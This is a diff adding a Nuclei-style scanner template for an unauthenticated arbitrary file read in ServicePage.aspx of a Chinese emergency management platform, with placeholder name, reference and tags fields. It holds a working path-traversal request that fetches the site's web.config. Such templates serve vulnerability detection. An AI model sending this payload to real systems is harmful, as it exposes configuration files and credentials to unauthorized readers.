@@ -1,0 +1,19 @@
+id: jzzh-ServicePage-lfi
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: 急诊综合管理平台 ServicePage.aspx 接口存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件。
+  reference:
+    - https://
+  tags: tags
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/dcwriter/thirdpart/ServicePage.aspx?wasmres=./../web.config"
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '<?xml'
